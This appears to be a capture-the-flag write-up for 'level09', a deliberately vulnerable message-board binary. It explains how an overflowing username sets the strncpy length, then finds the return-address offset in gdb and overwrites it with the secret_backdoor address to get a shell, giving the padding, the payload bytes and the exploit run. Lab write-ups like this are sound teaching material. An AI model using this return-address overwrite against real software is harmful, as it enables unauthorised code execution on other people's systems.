# This is the end (level09)

This last [binary](source.c) is a leet message board. The user inputs his
username and a message on stdin. This is done through protected `fgets` calls.
However the *set_username* function starts writing the given *username* from the
end of the 140 bytes *buffer*, directly overflowing it. It writes 41 bytes of
username and prints a welcome to the user. Then *set_msg* reads a message into
a 1024 bytes buffer. It copies it in the same buffer but from the start.

This `strncpy` call is really vulnerable since it takes it size value from the
180th byte of the input buffer (yeah weird, I know). So basically we can decide
how much of the message we want to write by setting the last byte of the
username to a character of this value. This means that we can write up to 255
characters in the 140 bytes buffer.

All we have to do is compute the offset for the return address of the
*handle_msg* function where the buffer resides from the said buffer. Then we set
the bytes of the message at this offset to be the address of the
*secret_backdoor* function which will give us a shell.

We try with this command as input for the message prompt to get the offset:

```shell
python -c 'print "a" * 180 + "bbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm"'
```

> Here the 41st charcter of the username is 0xff so that we overflow as much as
> possible.

This results in a segfault in gdb at the address '0x6868686867676767' which is
'gggghhhh' in memory. So our offset is 200 and we need to write 8 bytes because
this is a 64bit binary.

We get the address of the backdoor in gdb:

```shell
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

So here are the payloads:

| input    | padding   | payload                                 |
|----------|-----------|-----------------------------------------|
| username | "a" * 40  | 0xd0 which is 208 in decimal            |
| message  | "a" * 200 | 0x55555555488c secret\_backdoor address |

Just run the [exploit.bash](exploit.bash) script and you get your shell:

```shell
# run the exploit
./exploit.bash | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>: Msg @Unix-Dude
>>: >: Msg sent!
# enjoy your shell
whoami
end
```
